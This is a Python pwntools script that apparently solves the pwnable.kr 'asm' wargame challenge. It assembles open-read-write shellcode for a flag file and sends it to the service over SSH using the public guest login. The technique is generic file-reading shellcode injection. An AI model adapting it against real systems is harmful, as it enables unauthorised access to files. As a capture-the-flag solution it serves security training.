"""
pwnable.kr-asm solution
author: Weston Silbaugh
"""
from pwn import *

def main():
	filename = 'this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong'

	context(arch='amd64', os='linux')

	#craft shellcode to send
	shellc = ''
	shellc += shellcraft.pushstr(filename)
	shellc += shellcraft.open('rsp',0,0) #string on top of stack
	shellc += shellcraft.read('rax','rsp',1024)
	shellc += shellcraft.write(1,'rsp',1024)
	shellc += shellcraft.exit('0')
	#compile shellcode
	shellcode = asm(shellc)

	#connect and send shellcode
	con = ssh(host='pwnable.kr', port=2222, user='asm', password='guest')
	r = con.connect_remote('localhost', 9026)

	r.recvuntil('shellcode:')
	r.send(shellcode)

	#get our flag and print any additional text from service
	out = r.recvline(timeout=0.5)
	while(len(out) > 0):
		print(out)
		out = r.recvline(timeout=0.5)

if __name__ == '__main__':
	main()

